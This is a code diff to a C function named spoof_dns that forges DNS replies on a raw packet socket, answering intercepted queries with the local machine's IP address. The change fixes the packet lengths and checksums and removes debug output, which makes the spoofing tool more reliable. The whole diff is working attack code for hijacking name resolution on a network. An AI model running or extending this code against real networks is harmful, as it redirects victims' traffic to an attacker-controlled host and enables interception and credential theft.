@@ -370,23 +370,14 @@ void spoof_dns(int sock) {
         ih->protocol = IPPROTO_UDP;
         ih->saddr = recv_ih->daddr;
         ih->daddr = recv_ih->saddr;
-        ih->tot_len = htons(20 + sizeof(struct udphdr) + data_len);
         ih->id = htons(ntohs(recv_ih->id) + 1);
         ih->ttl = recv_ih->ttl;
         ih->tos = 0;
         ih->frag_off = 0;
-        //Calculate ip checksum
-        ih->check = 0;
-        ih->check = csum((unsigned short*) ih, sizeof(struct iphdr));
 
         //UDP stuffs
         uh->source = recv_uh->dest;
         uh->dest = recv_uh->source;
-        uh->len = htons(data_len + sizeof(struct udphdr));
-
-        //Calculate udp checksum
-        uh->check = 0;
-        uh->check = htons(ntohs(udp_checksum(uh, data_len, ih->saddr, ih->daddr)) - 8);
 
         //DNS stuffs
         //Transaction ID
@@ -405,8 +396,6 @@ void spoof_dns(int sock) {
         //Zero authority or additional RR
         memset(data + 8, 0, 4);
 
-        printf("Initial name length: %d\n", recv_data[12]);
-
         //Time to parse question string
         int name_len = 0;
         int section_count = 0;
@@ -414,20 +403,10 @@ void spoof_dns(int sock) {
             if (recv_data[12 + name_len + section_count] == 0x00) {
                 break;
             }
-            //if (name_len == 0) {
-                //printf("Updating section with: %d\n", recv_data[12]);
-                //name_len = recv_data[12 + name_len + section_count];
-            //} else {
-                printf("Updating section with: %d\n", recv_data[12 + name_len + section_count]);
-                name_len += recv_data[12 + name_len + section_count++];
-            //}
-        printf("Loop Name len: %d\n", name_len);
+            name_len += recv_data[12 + name_len + section_count++];
         }
-        //name_len += section_count - 1;
         name_len += section_count;
         memcpy(data + 12, recv_data + 12, name_len);
-
-        printf("Name len: %d\n", name_len);
 
         //NULL terminate name
         data[12 + name_len + 0] = 0x00;
@@ -461,6 +440,22 @@ void spoof_dns(int sock) {
 
         memcpy(data + 12 + name_len + 17, &local_ip, 4);
 
+        //Set DNS packet length
+        data_len = 33 + name_len;
+
+        //Set IP len
+        ih->tot_len = htons(20 + sizeof(struct udphdr) + data_len);
+        //Calculate IP checksum
+        ih->check = 0;
+        ih->check = csum((unsigned short*) ih, sizeof(struct iphdr));
+
+        //Set UDP len
+        uh->len = htons(data_len + sizeof(struct udphdr));
+
+        //Calculate UDP checksum
+        uh->check = 0;
+        uh->check = htons(ntohs(udp_checksum(uh, data_len, ih->saddr, ih->daddr)) - 8);
+
         struct sockaddr_ll addr = {0};
         addr.sll_family = AF_PACKET;
         addr.sll_ifindex = local_interface_index;
@@ -470,7 +465,7 @@ void spoof_dns(int sock) {
 
         sendto(sock, buffer,
                 sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr)
-                        + data_len + 40,
+                        + data_len,
                 0, (struct sockaddr*) &addr, sizeof(struct sockaddr_ll));
         printf("Spoofed dns response\n");
     }
